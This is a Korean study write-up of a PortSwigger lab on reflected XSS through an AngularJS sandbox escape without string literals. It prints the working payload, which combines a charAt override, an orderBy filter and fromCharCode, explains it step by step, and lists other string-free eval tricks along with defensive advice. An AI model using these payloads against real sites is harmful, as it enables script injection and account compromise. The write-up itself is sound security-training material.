# Lab: Reflected XSS with AngularJS sandbox escape without strings

## 개요

- **난이도**: Expert
- **주제**: Cross-Site Scripting (XSS) — Client-Side Template Injection / AngularJS 샌드박스 탈출 / 문자열 없이 실행
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings

## 목표

AngularJS 샌드박스가 활성화되어 있고 문자열 리터럴(`'...'`, `"..."`)도 차단된 환경에서, `toString().constructor` 체인 + `charAt` 오버라이드 + `orderBy` 필터 + `fromCharCode` 를 조합해 `alert()` 를 실행시킨다.

## 제약 조건

```
차단됨:
  'alert'         — 문자열 리터럴 (단일 따옴표)
  "alert"         — 문자열 리터럴 (이중 따옴표)
  window          — 전역 객체 직접 접근
  constructor     — (직접 속성 접근)
  __proto__       — 프로토타입 직접 접근
  Function        — 함수 생성자 직접 접근
  eval            — 직접 eval 접근

허용됨:
  toString()      — 메서드 호출 (문자열이 아닌 메서드)
  .constructor    — 반환된 객체의 constructor 접근
  fromCharCode()  — 숫자 → 문자 변환
  [1]|orderBy:..  — orderBy 필터를 통한 표현식 평가
```

## 최종 페이로드

```
/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

URL 디코딩:

```
/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

## 단계별 분해 분석

### 전체 구조

```
[표현식 1] ; [표현식 2]

표현식 1: toString().constructor.prototype.charAt=[].join
표현식 2: [1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

Angular는 `;` 로 구분된 두 표현식을 순서대로 실행한다.

---

### 1단계: `toString().constructor` — 샌드박스 밖의 객체 간접 획득

**문제**: 샌드박스 안에서 `String`, `Function`, `window` 에 직접 접근할 수 없다.

**해결**: 메서드를 *호출*하여 그 반환값의 `.constructor` 를 통해 간접 접근한다.

```javascript
// 샌드박스 안에서 직접 접근 — 차단됨
String           // → 에러
window.String    // → 에러

// 간접 접근 — 허용됨
toString()           // → "1" (숫자 1에 toString 호출 → 문자열 반환)
toString().constructor  // → String 함수 자체
                        //   (문자열의 constructor = String)

// 이후 String 의 모든 정적 메서드 사용 가능
toString().constructor.fromCharCode(65)  // → "A"
```

**"export" 개념 (혼동 포인트)**:

샌드박스가 `String` 을 직접 막아도, `toString()` 의 *반환값* 은 진짜 문자열 객체이고  
그 `.constructor` 는 샌드박스 외부의 실제 `String` 함수를 가리킨다.  
샌드박스를 **우회하는 것이 아니라 샌드박스가 반환한 값을 통해 외부로 나가는 경로**를 찾는 것이다.

```
[샌드박스 안]          [샌드박스 밖]
     │                      │
     │  toString() 호출      │
     │ ─────────────────►  "1" (진짜 JS 문자열 객체)
     │                      │
     │  .constructor 접근    │
     │ ◄────────────────── String 함수 (진짜 JS 내장 함수)
     │                      │
     │  이제 String.fromCharCode 등 사용 가능
```

---

### 2단계: `charAt` 오버라이드 — 샌드박스의 안전성 검사 무력화

```javascript
toString().constructor.prototype.charAt = [].join
```

**왜 이게 필요한가?**

Angular 샌드박스의 `$parse` 서비스는 표현식을 평가할 때 내부적으로 `charAt` 를 호출해 위험한 속성 접근을 감지한다:

```javascript
// Angular 내부 (개념적 의사코드)
function ensureSafe(obj, key) {
    if (key.charAt(0) === '_') throw Error('Unsafe access');
    if (key === 'constructor') throw Error('Unsafe access');
    // ...
}
```

**`charAt` 를 `[].join` 으로 교체하면**:

```javascript
// 원래 동작
'constructor'.charAt(0)  // → 'c' (정상 반환)

// 오버라이드 후
[].join.call('constructor', 0)  // → "" (빈 문자열)
//   ↑
//   [].join() 은 배열 요소를 합치는 함수
//   문자열에 call 하면 의미없는 빈 문자열 반환

// 결과: 샌드박스의 charAt 기반 검사가 모두 빈 문자열을 받아 실패
//   → "unsafe" 감지 불가 → 검사 통과
```

---

### 3단계: `fromCharCode` — 문자열 리터럴 없이 문자열 생성

문자열 `'alert(1)'` 을 코드에 직접 쓸 수 없으므로, 아스키 코드로 우회한다.

```javascript
toString().constructor.fromCharCode(
    120, 61, 97, 108, 101, 114, 116, 40, 49, 41
)
```

각 숫자의 아스키 문자:

| 코드 | 문자 | 코드 | 문자 |
|------|------|------|------|
| 120 | `x` | 116 | `t` |
| 61  | `=` | 40  | `(` |
| 97  | `a` | 49  | `1` |
| 108 | `l` | 41  | `)` |
| 101 | `e` | | |
| 114 | `r` | | |

결과: `"x=alert(1)"` — 문자열 리터럴 없이 문자열 생성 완료.

---

### 4단계: `orderBy` 필터 — 문자열을 Angular 표현식으로 실행

```
[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

**`orderBy` 가 표현식 실행기로 동작하는 이유**:

```javascript
// orderBy 의 정상 용도
[{name:'b'},{name:'a'}] | orderBy:'name'
// → 'name' 을 속성 키로 사용해 정렬

// orderBy 는 내부적으로 $parse 를 사용해 정렬 키를 평가
// $parse('name') → items.name 을 읽는 함수 생성

// 악용:
[1] | orderBy:'x=alert(1)'
// $parse('x=alert(1)') → x에 alert(1) 결과를 할당하는 함수 생성
// 이 함수가 [1]의 각 요소에 대해 호출될 때 alert(1) 실행!
```

`=1` 부분:

```
[1]|orderBy:...:1
         →  ↑
            역방향 정렬 플래그 (reverse=true)
            이 값이 있어야 orderBy 가 표현식을 올바르게 처리하는 버전이 있음
```

---

### 전체 실행 흐름

```
URL 파라미터: ?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:...

Angular가 {{}} 또는 ng-bind 로 표현식 평가:

1. toString().constructor.prototype.charAt = [].join
   → String 의 charAt 메서드를 [].join 으로 교체
   → 이후 Angular 샌드박스의 모든 charAt 기반 검사가 무력화

2. [1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
   → toString().constructor = String 획득 (샌드박스 우회)
   → String.fromCharCode(...) = "x=alert(1)" 생성 (문자열 리터럴 없이)
   → orderBy 필터가 "x=alert(1)" 을 $parse로 실행
   → alert(1) 호출!
```

## 이전 AngularJS 랩과 비교

| 항목 | 011 랩 (기본 샌드박스 탈출) | 025 랩 (문자열 없는 탈출) |
|------|--------------------------|------------------------|
| 페이로드 | `{{constructor.constructor('alert(1)')()}}` | `toString().constructor` + `fromCharCode` + `orderBy` |
| 문자열 리터럴 | `'alert(1)'` 직접 사용 | 사용 불가 — `fromCharCode` 로 우회 |
| 실행 경로 | `Function` 생성자 직접 호출 | `orderBy` 필터를 통한 간접 실행 |
| 난이도 | Practitioner | Expert |
| 우회 핵심 | constructor 체인 | charAt 오버라이드 + 간접 접근 |

## 핵심 정리

- Angular 샌드박스는 `charAt` 를 통한 속성 접근 검사에 의존한다 — `charAt` 를 교체하면 검사가 무력화된다.
- `toString().constructor` 는 문자열 리터럴 없이 샌드박스 밖의 `String` 함수에 접근하는 간접 경로다.
- `fromCharCode` 는 ASCII 코드로 문자열을 조립해 문자열 리터럴 차단을 우회한다.
- `orderBy` 필터는 인자 문자열을 `$parse` 로 평가하므로 표현식 실행기로 악용 가능하다.
- **방어**: Angular 1.x 샌드박스는 근본적으로 취약하다 — Angular 2+ 로 마이그레이션하거나, 사용자 입력이 Angular 표현식 컨텍스트에 들어가지 않도록 템플릿을 구성한다.

## 배운 점 및 추가 학습

### 1. `fromCharCode` 활용 패턴

```javascript
// 기본
String.fromCharCode(97, 108, 101, 114, 116)  // → "alert"

// 모든 JS 함수 이름을 숫자로 대체 가능
String.fromCharCode(101,118,97,108)           // → "eval"
String.fromCharCode(100,111,99,117,109,101,110,116)  // → "document"

// 파이썬으로 변환 스크립트
// [ord(c) for c in "alert(1)"]
// → [97, 108, 101, 114, 116, 40, 49, 41]

// JS에서 역방향 (문자 → 코드)
"alert".split('').map(c => c.charCodeAt(0))
// → [97, 108, 101, 114, 116]
```

### 2. Angular 샌드박스의 보호 메커니즘

```javascript
// Angular $parse 가 차단하는 것들 (개념적)
var UNSAFE_PROP = /^(constructor|__proto__|__defineGetter__|...)$/;

function ensureSafe(value, key) {
    // 위험 키 직접 접근 차단
    if (UNSAFE_PROP.test(key)) throw Error();
    // constructor 에 Function 이 있으면 차단
    if (value.constructor === Function) throw Error();
    // ...
}

// charAt 오버라이드가 이것을 무력화하는 방법:
// key.charAt(0) === '_' 같은 검사에서
// charAt 이 항상 "" 반환 → 모든 검사가 false → 통과
```

### 3. JavaScript 문자열 없이 함수 실행하는 기법들

```javascript
// 1. fromCharCode (이번 랩)
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// 2. 배열과 join
['ale','rt'].join('')  // → "alert" (배열은 문자열 리터럴이 아님)
// 그러나 'ale' 자체가 문자열이므로 이 랩에서는 불가

// 3. 정규식과 toString
/alert/.source  // → "alert" (정규식은 문자열 리터럴이 아님!)
eval(/alert(1)/.source)
// → 정규식 리터럴은 차단 안 된 경우에 유용

// 4. btoa/atob (Base64)
atob('YWxlcnQoMSk=')  // → "alert(1)"
eval(atob('YWxlcnQoMSk='))

// 5. 유니코드 이스케이프 (일부 환경)
'alert'  // → "alert"
// 그러나 이것도 문자열 리터럴에 해당

// 6. 숫자 → 문자 변환 (fromCharCode 의 다른 경로)
String.fromCodePoint(97, 108, 101, 114, 116)  // → "alert"
```

### 4. AngularJS 샌드박스 탈출 역사 (시간순)

```
Angular 1.0~1.1: 샌드박스 없음 → {{constructor.constructor('alert(1)')()}} 바로 동작

Angular 1.2: 샌드박스 도입
  → Function, window 직접 접근 차단

Angular 1.3: 강화
  → constructor 접근 차단 강화
  → 우회: toString().constructor.constructor(...)

Angular 1.4~1.5: 더 강화
  → charAt 기반 검사 추가
  → 우회: charAt 오버라이드 (이번 랩)

Angular 1.6: 샌드박스 완전 제거 선언
  "샌드박스는 보안 기능이 아니다" — Angular 팀 공식 입장
  → 사용자 입력을 템플릿에 넣지 않는 것이 올바른 방어

Angular 2+: 완전히 다른 아키텍처
  → 클라이언트 사이드 템플릿 인젝션 취약점 구조 자체가 없음
```

### 5. `charAt` vs 인덱스 접근 차이

```javascript
var s = "hello";

s.charAt(0)  // → "h"  ← Angular 샌드박스가 이 메서드를 후킹해서 검사
s[0]         // → "h"  ← 인덱스 접근은 charAt 와 무관

// 샌드박스가 charAt 를 기반으로 하면:
// → charAt 를 교체하면 검사 무력화
// → s[0] 방식 접근은 영향 없음

// 실제 오버라이드:
String.prototype.charAt = [].join
// → 이제 모든 문자열의 charAt 이 [].join 처럼 동작
//   'constructor'.charAt(0) → ""  (공격자가 원하는 동작)
```

### 6. `orderBy` 의 $parse 악용 패턴

```javascript
// Angular orderBy 내부 (개념적)
function orderByFilter($parse) {
    return function(array, expression) {
        var predicate = $parse(expression);  // ← 문자열을 JS 표현식으로 컴파일
        return array.sort(function(a, b) {
            return predicate(a) - predicate(b);  // ← 각 요소에 대해 실행
        });
    };
}

// "x=alert(1)" 이 expression 으로 들어오면:
// $parse("x=alert(1)") → x에 alert(1)을 대입하는 함수 생성
// 배열 [1]의 요소 1에 대해 실행 → alert(1) 호출
```

`orderBy` 외에도 `filter`, `limitTo` 등 Angular 내장 필터들이 비슷하게 악용될 수 있다.
